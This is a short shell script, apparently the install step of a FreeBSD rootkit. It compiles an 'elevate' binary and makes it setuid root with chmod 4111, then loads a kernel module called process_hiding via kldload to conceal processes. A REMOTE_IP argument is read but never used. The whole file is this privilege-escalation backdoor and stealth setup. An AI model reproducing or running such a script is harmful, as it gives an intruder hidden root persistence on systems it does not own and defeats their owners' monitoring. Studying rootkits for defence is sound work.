// compile elevation binary
// chmod compiled binary with execute
// kld load process_hiding
// exit

#!/bin/sh
REMOTE_IP=$1
set -e
cc -o elevate src/elevate/elevate.c
chmod 4111 elevate
echo "Elevation compiled"
kldload -v src/process_hiding/process_hiding.ko
echo "Process hiding created and hidden"
exit 0
